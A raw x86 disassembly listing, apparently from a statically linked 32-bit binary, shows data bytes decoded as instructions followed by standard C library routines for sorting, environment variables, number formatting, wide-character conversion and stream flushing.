add byte [edi - 0x78000000], al
add byte [eax], al
add byte [ecx - 0x76000000], cl
add byte [eax], al
add byte [ebx - 0x74000000], cl
add byte [eax], al
add byte [ebp - 0x72000000], cl
add byte [eax], al
add byte [edi - 0x70000000], cl
add byte [eax], al
add byte [ecx - 0x6e000000], dl
add byte [eax], al
add byte [ebx - 0x6c000000], dl
add byte [eax], al
add byte [ebp - 0x6a000000], dl
add byte [eax], al
add byte [edi - 0x68000000], dl
add byte [eax], al
add byte [ecx - 0x66000000], bl
add byte [eax], al
add byte [ebx - 0x64000000], bl
add byte [eax], al
add byte [ebp - 0x62000000], bl
add byte [eax], al
add byte [edi - 0x60000000], bl
add byte [eax], al
add byte [ecx - 0x5e000000], ah
add byte [eax], al
add byte [ebx - 0x5c000000], ah
add byte [eax], al
add byte [ebp - 0x5a000000], ah
add byte [eax], al
add byte [edi - 0x58000000], ah
add byte [eax], al
add byte [ecx - 0x56000000], ch
add byte [eax], al
add byte [ebx - 0x54000000], ch
add byte [eax], al
add byte [ebp - 0x52000000], ch
add byte [eax], al
add byte [edi - 0x50000000], ch
add byte [eax], al
add byte [ecx - 0x4e000000], dh
add byte [eax], al
add byte [ebx - 0x4c000000], dh
add byte [eax], al
add byte [ebp - 0x4a000000], dh
add byte [eax], al
add byte [edi - 0x48000000], dh
add byte [eax], al
add byte [ecx - 0x46000000], bh
add byte [eax], al
add byte [ebx - 0x44000000], bh
add byte [eax], al
add byte [ebp - 0x42000000], bh
add byte [eax], al
add byte [edi - 0x40000000], bh
add byte [eax], al
add cl, al
add byte [eax], al
add dl, al
add byte [eax], al
add bl, al
add byte [eax], al
add ah, al
add byte [eax], al
add ch, al
add byte [eax], al
add dh, al
add byte [eax], al
add bh, al
add byte [eax], al
add al, cl
add byte [eax], al
add cl, cl
add byte [eax], al
add dl, cl
add byte [eax], al
add bl, cl
add byte [eax], al
add ah, cl
add byte [eax], al
add ch, cl
add byte [eax], al
add dh, cl
add byte [eax], al
add bh, cl
add byte [eax], al
add al, dl
add byte [eax], al
add cl, dl
add byte [eax], al
add dl, dl
add byte [eax], al
add bl, dl
add byte [eax], al
add ah, dl
add byte [eax], al
add ch, dl
add byte [eax], al
add dh, dl
add byte [eax], al
add bh, dl
add byte [eax], al
add al, bl
add byte [eax], al
add cl, bl
add byte [eax], al
add dl, bl
add byte [eax], al
add bl, bl
add byte [eax], al
add ah, bl
add byte [eax], al
add ch, bl
add byte [eax], al
add dh, bl
add byte [eax], al
add bh, bl
add byte [eax], al
add al, ah
add byte [eax], al
add cl, ah
add byte [eax], al
add dl, ah
add byte [eax], al
add bl, ah
add byte [eax], al
add ah, ah
add byte [eax], al
add ch, ah
add byte [eax], al
add dh, ah
add byte [eax], al
add bh, ah
add byte [eax], al
add al, ch
add byte [eax], al
add cl, ch
add byte [eax], al
add dl, ch
add byte [eax], al
add bl, ch
add byte [eax], al
add ah, ch
add byte [eax], al
add ch, ch
add byte [eax], al
add dh, ch
add byte [eax], al
add bh, ch
add byte [eax], al
add al, dh
add byte [eax], al
add cl, dh
add byte [eax], al
add dl, dh
add byte [eax], al
add bl, dh
add byte [eax], al
add ah, dh
add byte [eax], al
add ch, dh
add byte [eax], al
add dh, dh
add byte [eax], al
add bh, dh
add byte [eax], al
add al, bh
add byte [eax], al
add cl, bh
add byte [eax], al
add dl, bh
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x3c
mov edx, dword [arg_14h]
mov edi, dword [arg_10h]
mov eax, dword [arg_8h]
mov ebx, dword [arg_ch]
mov dword [var_14h], edx
mov dword [var_10h], eax
cmp ebx, 1
mov eax, dword [arg_18h]
mov dword [var_18h], eax
ja 0x8062eee
add esp, 0x3c
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [var_10h]
mov esi, ebx
mov edx, ebx
shr esi, 1
sub edx, esi
mov dword [var_20h], eax
mov dword [var_28h], edx
mov eax, esi
imul eax, edi
mov edx, dword [var_18h]
add eax, dword [var_10h]
mov dword [var_24h], eax
mov dword [var_sp_10h], edx
mov eax, dword [var_14h]
mov dword [var_8h], edi
mov dword [var_4h], esi
mov dword [var_ch], eax
mov edx, dword [var_10h]
mov dword [esp], edx
call fcn.08062ec0
mov eax, dword [var_18h]
mov dword [var_sp_10h], eax
mov edx, dword [var_14h]
mov dword [var_8h], edi
mov dword [var_ch], edx
mov eax, dword [var_28h]
mov dword [var_4h], eax
mov edx, dword [var_24h]
mov dword [esp], edx
call fcn.08062ec0
mov eax, dword [var_18h]
cmp edi, 4
mov dword [var_1ch], eax
je 0x8063005
test esi, esi
jne 0x8062f83
sub ebx, dword [var_28h]
mov eax, dword [var_18h]
mov edx, dword [var_10h]
mov dword [arg_ch], eax
imul ebx, edi
mov dword [arg_8h], edx
mov dword [arg_10h], ebx
add esp, 0x3c
pop ebx
pop esi
pop edi
leave
jmp fcn.08053770
mov edx, dword [var_28h]
test edx, edx
jne 0x8062fa9
test esi, esi
je 0x8062f62
imul esi, edi
mov dword [var_8h], esi
mov eax, dword [var_20h]
mov dword [var_4h], eax
mov edx, dword [var_1ch]
mov dword [esp], edx
call fcn.08053770
jmp 0x8062f62
mov eax, dword [var_24h]
mov dword [var_4h], eax
mov edx, dword [var_20h]
mov dword [esp], edx
call dword [var_14h]
test eax, eax
jle 0x8062fe9
mov dword [var_8h], edi
mov eax, dword [var_24h]
mov dword [var_4h], eax
mov edx, dword [var_1ch]
mov dword [esp], edx
call fcn.08053740
dec dword [var_28h]
add dword [var_24h], edi
mov dword [var_1ch], eax
test esi, esi
je 0x8062f62
mov eax, dword [var_28h]
test eax, eax
jne 0x8062fa9
jmp 0x8062f8a
mov dword [var_8h], edi
dec esi
mov eax, dword [var_20h]
mov dword [var_4h], eax
mov edx, dword [var_1ch]
mov dword [esp], edx
call fcn.08053740
add dword [var_20h], edi
jmp 0x8062fd9
test byte [var_10h], 3
jne 0x8062f5e
test esi, esi
je 0x8062f62
mov eax, dword [var_28h]
test eax, eax
je 0x8062f8a
mov edx, dword [var_24h]
mov dword [var_4h], edx
mov eax, dword [var_20h]
mov dword [esp], eax
call dword [var_14h]
test eax, eax
jle 0x8063061
mov edx, dword [var_24h]
dec dword [var_28h]
add dword [var_24h], 4
mov eax, dword [edx]
mov edx, dword [var_1ch]
mov dword [edx], eax
add edx, 4
mov dword [var_1ch], edx
test esi, esi
je 0x8062f62
mov ecx, dword [var_28h]
test ecx, ecx
jne 0x8063022
jmp 0x8062f8a
mov edx, dword [var_20h]
dec esi
add dword [var_20h], 4
jmp 0x8063040
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x14c
mov edx, dword [arg_10h]
mov eax, dword [arg_8h]
mov dword [var_11ch], eax
shl edx, 2
mov eax, dword [arg_ch]
mov dword [var_120h], edx
test eax, eax
je 0x8084cfe
lea edx, [eax - 1]
cmp eax, 4
mov dword [var_140h], edx
jbe 0x8084c06
mov eax, dword [arg_10h]
mov edx, dword [var_11ch]
mov dword [var_118h], 0
imul eax, dword [var_140h]
mov dword [var_114h], 0
mov dword [var_124h], edx
add eax, edx
lea edx, [var_118h]
mov dword [var_128h], eax
lea eax, [var_110h]
cmp edx, eax
mov dword [var_12ch], eax
jb 0x8084d24
mov eax, dword [arg_10h]
mov esi, dword [var_11ch]
imul eax, dword [var_140h]
mov edx, dword [var_120h]
lea ebx, [edx + esi]
add eax, dword [var_11ch]
cmp ebx, eax
mov dword [var_138h], eax
cmova ebx, eax
mov eax, dword [arg_10h]
lea edi, [eax + esi]
cmp edi, ebx
mov dword [var_144h], edi
jbe 0x8084d09
cmp esi, dword [var_11ch]
je 0x8084c66
mov edi, dword [arg_10h]
mov ebx, esi
mov ecx, dword [var_11ch]
movzx edx, byte [ebx]
movzx eax, byte [ecx]
mov byte [ebx], al
mov byte [ecx], dl
inc ebx
inc ecx
dec edi
jne 0x8084c57
mov edi, dword [var_144h]
add edi, dword [arg_10h]
cmp edi, dword [var_138h]
ja 0x8084cfe
mov esi, edi
lea esi, [esi]
sub esi, dword [arg_10h]
mov dword [esp], edi
mov dword [var_4h], esi
call dword [arg_14h]
test eax, eax
js 0x8084c80
add esi, dword [arg_10h]
mov edx, dword [arg_10h]
lea edx, [edx + edi]
cmp esi, edi
mov dword [var_148h], edx
je 0x8084cec
mov eax, dword [arg_10h]
add eax, edi
mov ebx, eax
mov dword [var_148h], eax
dec ebx
cmp ebx, edi
jb 0x8084cec
movzx edx, byte [ebx]
mov ecx, ebx
mov byte [var_139h], dl
mov edx, ebx
sub edx, dword [arg_10h]
cmp edx, esi
jb 0x8084cde
lea esi, [esi]
movzx eax, byte [edx]
mov byte [ecx], al
mov ecx, edx
sub edx, dword [arg_10h]
cmp edx, esi
jae 0x8084cd0
movzx eax, byte [var_139h]
dec ebx
cmp ebx, edi
mov byte [ecx], al
jae 0x8084cb6
mov edi, dword [var_148h]
cmp edi, dword [var_138h]
jbe 0x8084c7b
add esp, 0x14c
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_4h], esi
mov dword [esp], edi
call dword [arg_14h]
test eax, eax
cmovs esi, edi
add edi, dword [arg_10h]
cmp edi, ebx
jbe 0x8084d09
jmp 0x8084c44
mov eax, dword [var_128h]
xor edx, edx
sub eax, dword [var_124h]
div dword [arg_10h]
shr eax, 1
imul eax, dword [arg_10h]
add eax, dword [var_124h]
mov dword [var_134h], eax
mov edx, dword [var_134h]
mov eax, dword [var_124h]
mov dword [esp], edx
mov dword [var_4h], eax
call dword [arg_14h]
test eax, eax
js 0x8084fa5
mov eax, dword [var_134h]
mov edx, dword [var_128h]
mov dword [var_4h], eax
mov dword [esp], edx
call dword [arg_14h]
test eax, eax
js 0x8084f46
mov eax, dword [var_124h]
mov edi, dword [var_128h]
add eax, dword [arg_10h]
sub edi, dword [arg_10h]
mov dword [var_130h], eax
nop
lea esi, [esi]
mov eax, dword [var_134h]
mov edx, dword [var_130h]
mov dword [var_4h], eax
mov dword [esp], edx
call dword [arg_14h]
test eax, eax
js 0x8084f38
mov esi, esi
mov eax, dword [var_134h]
mov dword [var_4h], edi
mov dword [esp], eax
call dword [arg_14h]
test eax, eax
jns 0x8084dd9
sub edi, dword [arg_10h]
jmp 0x8084dc0
cmp dword [var_130h], edi
jae 0x8084f1f
mov esi, dword [arg_10h]
mov ebx, dword [var_130h]
mov ecx, edi
movzx edx, byte [ebx]
movzx eax, byte [ecx]
mov byte [ebx], al
mov byte [ecx], dl
inc ebx
inc ecx
dec esi
jne 0x8084df0
mov edx, dword [var_130h]
cmp dword [var_134h], edx
je 0x8084f14
cmp dword [var_134h], edi
mov eax, dword [var_130h]
cmovne eax, dword [var_134h]
mov dword [var_134h], eax
mov edx, dword [arg_10h]
add dword [var_130h], edx
sub edi, edx
cmp dword [var_130h], edi
jbe 0x8084da0
mov eax, edi
sub eax, dword [var_124h]
cmp eax, dword [var_120h]
ja 0x8084eac
mov eax, dword [var_128h]
mov edx, dword [var_130h]
sub eax, dword [var_130h]
cmp eax, dword [var_120h]
mov dword [var_124h], edx
ja 0x8084e95
sub dword [var_12ch], 8
mov eax, dword [var_12ch]
mov edx, dword [var_12ch]
mov eax, dword [eax]
mov edx, dword [edx + 4]
mov dword [var_124h], eax
mov dword [var_128h], edx
lea eax, [var_118h]
cmp eax, dword [var_12ch]
jb 0x8084d24
jmp 0x8084c06
mov edx, dword [var_128h]
sub edx, dword [var_130h]
cmp edx, dword [var_120h]
jbe 0x8084f0c
cmp eax, edx
jle 0x8084eec
mov edx, dword [var_12ch]
mov eax, dword [var_124h]
mov dword [edx + 4], edi
mov dword [edx], eax
add edx, 8
mov dword [var_12ch], edx
mov edx, dword [var_130h]
mov dword [var_124h], edx
jmp 0x8084e95
mov eax, dword [var_12ch]
mov edx, dword [var_130h]
mov dword [eax], edx
mov edx, dword [var_128h]
mov dword [eax + 4], edx
add eax, 8
mov dword [var_12ch], eax
mov dword [var_128h], edi
jmp 0x8084e95
mov dword [var_134h], edi
jmp 0x8084e2a
jne 0x8084e35
mov eax, dword [arg_10h]
add eax, edi
sub edi, dword [arg_10h]
mov dword [var_130h], eax
jmp 0x8084e41
mov edx, dword [arg_10h]
add dword [var_130h], edx
jmp 0x8084da0
mov esi, dword [arg_10h]
mov ebx, dword [var_134h]
mov ecx, dword [var_128h]
movzx edx, byte [ebx]
movzx eax, byte [ecx]
mov byte [ebx], al
mov byte [ecx], dl
inc ebx
inc ecx
dec esi
jne 0x8084f55
mov eax, dword [var_124h]
mov edx, dword [var_134h]
mov dword [var_4h], eax
mov dword [esp], edx
call dword [arg_14h]
test eax, eax
jns 0x8084d83
mov esi, dword [arg_10h]
mov ebx, dword [var_134h]
mov ecx, dword [var_124h]
movzx edx, byte [ebx]
movzx eax, byte [ecx]
mov byte [ebx], al
mov byte [ecx], dl
inc ebx
inc ecx
dec esi
jne 0x8084f91
jmp 0x8084d83
mov esi, dword [arg_10h]
mov ebx, dword [var_134h]
mov ecx, dword [var_124h]
movzx edx, byte [ebx]
movzx eax, byte [ecx]
mov byte [ebx], al
mov byte [ecx], dl
inc ebx
inc ecx
dec esi
jne 0x8084fb4
jmp 0x8084d65
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x28
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08053400
mov esi, dword [arg_ch]
mov dword [var_14h], 0
mov edi, eax
test esi, esi
je 0x80632f3
mov edx, dword [var_ch_2]
mov dword [esp], edx
call fcn.08053400
inc eax
mov dword [var_14h_2], eax
mov eax, 0
test eax, eax
je 0x8063308
mov dword [esp], 0x80aa984
call section.
mov esi, dword [0x80aa840]
mov dword [var_10h], 0
test esi, esi
je 0x8063351
mov ebx, dword [esi]
test ebx, ebx
je 0x8063351
nop
mov dword [var_8h], edi
mov eax, dword [var_8h]
mov dword [var_4h], eax
mov eax, dword [esi]
mov dword [esp], eax
call fcn.08076fc0
test eax, eax
jne 0x8063345
mov eax, dword [esi]
cmp byte [edi + eax], 0x3d
je 0x80634dd
add esi, 4
inc dword [var_10h_2]
mov ecx, dword [esi]
test ecx, ecx
jne 0x8063320
mov edx, dword [var_10h]
lea eax, [edx*4 + 8]
mov dword [var_4h], eax
mov eax, dword [0x80aa9a0]
mov dword [esp], eax
call fcn.08051220
test eax, eax
mov ebx, eax
je 0x80634c6
mov edx, dword [arg_10h]
test edx, edx
je 0x80633d8
mov edx, dword [var_10h_3]
mov eax, dword [var_10h_2]
mov dword [ebx + eax*4], edx
mov esi, dword [0x80aa840]
cmp esi, dword [0x80aa9a0]
je 0x80633a2
mov ecx, dword [var_10h_2]
mov edi, ebx
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov eax, dword [var_10h_2]
mov dword [0x80aa840], ebx
mov dword [0x80aa9a0], ebx
mov dword [ebx + eax*4 + 4], 0
mov eax, 0
test eax, eax
je 0x80633ce
mov dword [esp], 0x80aa984
call section.
xor eax, eax
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [var_14h]
mov dword [var_18h], esp
lea esi, [eax + edi]
lea eax, [esi + 0x13]
and eax, 0xfffffffc
sub esp, eax
lea edx, [var_1bh]
and edx, 0xfffffff0
mov dword [var_1ch], edx
mov dword [var_8h], edi
mov eax, dword [var_8h]
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.08053740
mov byte [eax], 0x3d
mov edx, dword [var_14h_2]
inc eax
mov dword [var_8h], edx
mov edx, dword [var_ch_2]
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.08053740
mov dword [var_4h], 0x80aa99c
mov dword [var_8h], fcn.08076e50
mov eax, dword [var_1ch]
mov dword [esp], eax
call fcn.0807a2c0
xor edx, edx
test eax, eax
je 0x8063443
mov edx, dword [eax]
mov eax, dword [var_10h_2]
test edx, edx
mov dword [ebx + eax*4], edx
jne 0x8063491
inc esi
mov dword [esp], esi
call fcn.08050fe0
mov edx, dword [var_10h_2]
test eax, eax
mov dword [ebx + edx*4], eax
je 0x8063499
mov dword [var_8h], esi
mov edx, dword [var_1ch]
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.08053770
mov dword [var_4h], 0x80aa99c
mov dword [var_8h], fcn.08076e50
mov edx, dword [var_10h_2]
mov eax, dword [ebx + edx*4]
mov dword [esp], eax
call fcn.0807a190
mov esp, dword [var_18h_2]
jmp 0x8063386
call fcn.08048b20
mov dword [eax], 0xc
mov eax, 0
test eax, eax
je 0x80634b9
mov dword [esp], 0x80aa984
call section.
mov esp, dword [var_18h_2]
mov eax, 0xffffffff
jmp 0x80633d0
mov eax, 0
test eax, eax
je 0x80634bc
mov dword [esp], 0x80aa984
call section.
jmp 0x80634bc
test eax, eax
je 0x8063351
mov eax, dword [var_14h_3]
test eax, eax
je 0x80633b9
mov ebx, dword [var_10h_3]
test ebx, ebx
je 0x80634fe
mov dword [esi], ebx
jmp 0x80633b9
mov edx, dword [var_14h_2]
mov dword [var_20h], esp
add edx, edi
mov eax, edx
mov dword [var_24h], edx
add eax, 0x13
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_1bh]
and eax, 0xfffffff0
mov dword [var_28h], eax
mov dword [var_8h], edi
mov edx, dword [var_8h]
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.08053740
mov byte [eax], 0x3d
mov edx, dword [var_14h_2]
inc eax
mov dword [var_8h], edx
mov edx, dword [var_ch_2]
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.08053740
mov dword [var_4h], 0x80aa99c
mov dword [var_8h], fcn.08076e50
mov eax, dword [var_28h]
mov dword [esp], eax
call fcn.0807a2c0
xor edx, edx
test eax, eax
je 0x806356d
mov edx, dword [eax]
test edx, edx
mov ebx, edx
jne 0x80635b0
mov edi, dword [var_24h]
inc edi
mov dword [esp], edi
call fcn.08050fe0
test eax, eax
mov ebx, eax
je 0x80635b8
mov dword [var_8h], edi
mov edx, dword [var_28h]
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.08053770
mov dword [esp], ebx
mov dword [var_4h], 0x80aa99c
mov dword [var_8h], fcn.08076e50
call fcn.0807a190
mov esp, dword [var_20h]
jmp 0x80634f7
mov eax, 0
test eax, eax
je 0x80635cd
mov dword [esp], 0x80aa984
call section.
mov esp, dword [var_20h]
jmp 0x80634bc
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x2c
mov esi, dword [arg_18h]
mov dword [var_28h], str.0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZto_outpunct
mov eax, dword [arg_8h]
mov edx, dword [arg_ch]
mov ebx, dword [arg_10h]
test esi, esi
mov dword [var_24h], eax
mov dword [var_20h], edx
mov eax, 0x80a0960
cmovne eax, dword [var_28h]
mov edx, dword [arg_14h]
cmp edx, 8
mov dword [var_28h], eax
lea eax, [edx + edx*2]
lea eax, [eax*4 + str.nplurals]
mov dword [var_38h], eax
je 0x8063dff
cmp edx, 0x10
je 0x8063dbe
mov edi, dword [var_20h]
mov esi, edi
xor edi, edi
test esi, esi
mov dword [var_34h], esi
mov dword [var_30h], edi
je 0x8063dac
mov edi, dword [var_38h]
mov eax, dword [var_34h]
cmp dword [edi + 8], eax
ja 0x8063d91
xor edx, edx
mov dword [var_2ch], 3
div dword [edi + 8]
mov ecx, eax
mov eax, dword [var_24h]
div dword [edi + 8]
mov dword [var_14h], edx
mov edx, ecx
div dword [edi + 8]
mov dword [var_1ch], eax
mov dword [var_18h], edx
dec dword [var_2ch]
xor esi, esi
mov edi, dword [var_2ch]
mov eax, dword [ebp + edi*4 - 0x1c]
test eax, eax
je 0x8063d5c
xor edx, edx
mov edi, dword [var_28h]
dec ebx
div dword [arg_14h]
inc esi
mov ecx, eax
movzx eax, byte [edx + edi]
test ecx, ecx
mov byte [ebx], al
mov eax, ecx
jne 0x8063d44
mov ecx, dword [var_2ch]
test ecx, ecx
je 0x8063d87
mov edx, dword [var_38h]
movsx eax, byte [edx + 5]
cmp esi, eax
jge 0x8063d80
mov esi, esi
dec ebx
inc esi
mov byte [ebx], 0x30
mov ecx, dword [var_38h]
movsx eax, byte [ecx + 5]
cmp esi, eax
jl 0x8063d70
mov edx, dword [var_2ch]
test edx, edx
jne 0x8063d34
add esp, 0x2c
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
mov ecx, dword [var_38h]
mov eax, dword [var_24h]
mov dword [var_2ch], 2
mov edx, dword [var_34h]
div dword [ecx + 8]
mov dword [var_18h], edx
mov dword [var_1ch], eax
jmp 0x8063d34
mov esi, dword [var_24h]
mov dword [var_2ch], 1
mov dword [var_1ch], esi
jmp 0x8063d34
mov edx, dword [var_20h]
test edx, edx
je 0x8063dfa
mov ecx, dword [var_24h]
mov esi, 8
mov edi, dword [var_28h]
mov eax, ecx
dec esi
and eax, 0xf
dec ebx
shr ecx, 4
test esi, esi
movzx eax, byte [eax + edi]
mov byte [ebx], al
jg 0x8063dcd
mov ecx, dword [var_28h]
mov eax, edx
dec ebx
and eax, 0xf
shr edx, 4
movzx eax, byte [eax + ecx]
mov byte [ebx], al
jne 0x8063de4
jmp 0x8063d87
mov edx, dword [var_24h]
jmp 0x8063de4
mov edx, dword [var_20h]
test edx, edx
je 0x8063e5a
mov ecx, dword [var_24h]
mov esi, 0xa
mov edi, dword [var_28h]
mov eax, ecx
dec esi
and eax, 7
dec ebx
shr ecx, 3
test esi, esi
movzx eax, byte [eax + edi]
mov byte [ebx], al
jg 0x8063e0e
mov eax, edx
and eax, 1
shl eax, 2
or ecx, eax
shr edx, 1
jne 0x8063e4e
mov edx, ecx
mov edi, dword [var_28h]
mov eax, edx
dec ebx
and eax, 7
shr edx, 3
movzx eax, byte [eax + edi]
mov byte [ebx], al
jne 0x8063e35
jmp 0x8063d87
mov esi, dword [var_28h]
dec ebx
movzx eax, byte [ecx + esi]
mov byte [ebx], al
jmp 0x8063e35
mov edx, dword [var_24h]
jmp 0x8063e35
push ebp
mov eax, 0
mov ebp, esp
push edi
push esi
push ebx
sub esp, 8
test eax, eax
mov edi, dword [arg_8h]
je 0x807ad3b
mov dword [esp], 3
call section.
mov eax, dword [eax]
xor esi, esi
mov ebx, dword [eax + 0x50]
cmp byte [ebx], 0
je 0x807ad32
mov dword [var_4h], ebx
mov dword [esp], edi
call fcn.08076e50
test eax, eax
je 0x807ad36
mov dword [esp], ebx
mov dword [var_4h], 0
inc esi
call fcn.080537a0
cmp byte [eax + 1], 0
lea ebx, [eax + 1]
jne 0x807acb5
xor eax, eax
test al, al
je 0x807ad32
mov eax, 0
test eax, eax
je 0x807ad2b
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov ebx, dword [eax + 0x6c]
mov eax, 0
add ebx, esi
test eax, eax
je 0x807ad24
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + ebx*4 + 0x24]
add esp, 8
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [0x80a9ab4]
jmp 0x807ad16
mov eax, dword [0x80a9ab4]
jmp 0x807acfa
xor eax, eax
jmp 0x807ad1c
movzx eax, byte [ebx]
jmp 0x807ace1
mov eax, dword [0x80a9ab4]
jmp 0x807aca5
push ebp
mov ebp, esp
sub esp, 8
mov edx, dword [arg_ch]
mov dword [esp], ebx
mov dword [var_4h], esi
mov ebx, dword [arg_8h]
test edx, edx
mov eax, ebx
je 0x807ada2
mov ecx, dword [edx]
shr eax, cl
cmp eax, dword [edx + 4]
jae 0x807ada0
mov esi, dword [edx + eax*4 + 0x14]
test esi, esi
je 0x807ada0
mov ecx, dword [edx + 8]
mov eax, ebx
shr eax, cl
and eax, dword [edx + 0xc]
lea eax, [edx + eax*4]
mov ecx, dword [esi + eax]
test ecx, ecx
je 0x807ada0
mov eax, ebx
and eax, dword [edx + 0x10]
lea eax, [edx + eax*4]
add ebx, dword [ecx + eax]
lea esi, [esi]
mov eax, ebx
mov ebx, dword [esp]
mov esi, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
mov ebx, 0
sub esp, 0x5c
test ebx, ebx
mov esi, dword [arg_10h]
mov edi, dword [arg_8h]
mov dword [var_48h], esp
je 0x8077d22
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x58]
mov dword [var_1ch], 0
mov dword [var_34h], 1
mov dword [var_34h], 0
mov dword [var_30h], 1
add eax, 0x12
and eax, 0xfffffffc
sub esp, eax
mov eax, 0x80aa9b4
lea edx, [var_2fh]
and edx, 0xfffffff0
test esi, esi
cmovne eax, esi
test edi, edi
mov dword [var_2ch], eax
je 0x8077d14
test ebx, ebx
mov dword [var_3ch], edi
je 0x8077d0a
mov dword [esp], 3
call section.
mov eax, dword [eax]
test ebx, ebx
mov edx, dword [eax + 0x58]
lea eax, [edx + edi]
mov dword [var_3ch], eax
je 0x8077d00
mov dword [esp], 3
call section.
mov ebx, dword [eax]
mov eax, dword [ebx + 0x14]
test eax, eax
je 0x8077cde
mov esi, eax
mov eax, dword [var_8h]
test eax, eax
jne 0x8077c80
mov eax, dword [esi + 8]
mov eax, dword [eax + 0x14]
mov dword [esp], eax
call fcn.08083520
lea eax, [var_44h]
mov edx, dword [esi + 8]
mov dword [var_8h], 0
mov dword [var_14h], eax
mov dword [var_sp_1ch], 1
mov dword [var_18h], 1
lea eax, [var_40h]
mov dword [var_10h], 0
mov dword [var_ch], 0
mov dword [var_4h], eax
mov eax, dword [esi + 8]
mov dword [esp], eax
call dword [edx + 0x14]
test eax, eax
mov edx, eax
je 0x8077c6f
cmp eax, 4
je 0x8077c6f
nop
lea esi, [esi]
test edx, edx
jne 0x8077c36
mov ebx, dword [var_3ch]
sub ebx, edi
mov eax, ebx
mov esp, dword [var_48h_2]
lea esp, [var_ch_2]
pop ebx
pop esi
pop edi
leave
ret
cmp edx, 4
jne 0x8077c5b
test edx, edx
je 0x8077c24
cmp edx, 4
je 0x8077c24
cmp edx, 5
je 0x8077c24
call fcn.08048b20
mov ebx, 0xffffffff
mov dword [eax], 0x54
jmp 0x8077c29
cmp edx, 6
je 0x8077c3b
cmp edx, 7
je 0x8077c3b
cmp edx, 5
je 0x8077c3b
jmp 0x8077d2c
mov eax, dword [var_40h]
mov byte [eax], 0
inc dword [var_40h]
jmp 0x8077c20
lea esi, [esi]
lea eax, [var_ch]
mov dword [var_44h], eax
mov eax, dword [esi + 8]
mov eax, dword [eax + 0x14]
mov dword [esp], eax
call fcn.08083520
lea eax, [var_40h]
mov edx, dword [esi + 8]
mov dword [var_10h], 0
mov dword [var_sp_1ch], 1
mov dword [var_18h], 0
mov dword [var_14h], eax
mov eax, dword [var_44h]
add eax, 4
mov dword [var_ch], eax
lea eax, [var_44h]
mov dword [var_8h], eax
lea eax, [var_3ch]
mov dword [var_4h], eax
mov eax, dword [esi + 8]
mov dword [esp], eax
call dword [edx + 0x14]
mov edx, eax
jmp 0x8077c20
cmp ebx, 0x809ff60
mov esi, 0x8092dec
je 0x8077bb5
mov eax, ebx
call fcn.08053a60
mov eax, dword [ebx + 0x14]
jmp 0x8077bb3
mov esi, esi
mov eax, dword [0x80a9ab4]
jmp 0x8077ba6
mov eax, dword [0x80a9ab4]
jmp 0x8077b87
mov edi, edx
mov dword [var_ch], 0
jmp 0x8077b70
mov eax, dword [0x80a9ab4]
jmp 0x8077b2b
mov dword [var_ch], str.__wcrtomb
mov dword [var_8h], 0x62
mov dword [var_4h], str.wcrtomb.c
mov dword [esp], str.status____GCONV_OK__status____GCONV_EMPTY_INPUT__status____GCONV_ILLEGAL_INPUT__status____GCONV_INCOMPLETE_INPUT__status____GCONV_FULL_OUTPUT
call fcn.0805efc0
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
mov esi, eax
push ebx
lea ebx, [ebp - 0x20cc]
sub esp, 0x20e4
mov edi, dword [eax + 0x5c]
test edi, edi
jne 0x8067ad7
mov dword [eax + 0x5c], 0xffffffff
mov edi, 0xffffffff
cmp edi, 0xffffffff
mov eax, 0xffffffff
jne 0x8067bb0
lea eax, [ebp - 0x200c]
mov dword [ebp - 0x2034], esi
mov dword [ebp - 0x2070], 0xffffffff
mov dword [ebp - 0x20b8], eax
mov dword [ebp - 0x20bc], eax
mov dword [ebp - 0x20cc], 0xfbad8004
lea eax, [var_ch]
mov dword [ebp - 0x2084], 0
mov dword [ebp - 0x2038], 0x80a0f60
mov dword [ebp - 0x20b4], eax
mov dword [var_8h], ecx
mov dword [var_4h], edx
mov dword [esp], ebx
call fcn.08064160
mov dword [ebp - 0x20e0], eax
mov eax, 0
test eax, eax
setne al
movzx eax, al
test eax, eax
mov dword [ebp - 0x20e4], eax
jne 0x8067bef
cmp word [esi], 0
jns 0x8067be2
mov ebx, dword [ebp - 0x20b8]
mov edx, dword [ebp - 0x20bc]
sub ebx, edx
test ebx, ebx
jle 0x8067b9a
mov eax, dword [esi + 0x94]
mov dword [var_8h], ebx
mov dword [var_4h], edx
mov dword [esp], esi
call dword [eax + 0x1c]
cmp eax, ebx
cmove edi, dword [ebp - 0x20e0]
mov dword [ebp - 0x20e0], edi
cmp word [esi], 0
jns 0x8067bd8
mov eax, dword [ebp - 0x20e4]
test eax, eax
jne 0x8067bc0
mov eax, dword [ebp - 0x20e0]
add esp, 0x20e4
pop ebx
pop esi
pop edi
leave
ret
nop
lea esi, [esi]
lea eax, [ebp - 0x20dc]
mov dword [var_4h], 0
mov dword [esp], eax
call section.
jmp 0x8067baa
mov dword [esp], esi
call fcn.08074580
jmp 0x8067ba0
mov dword [esp], esi
call fcn.08074540
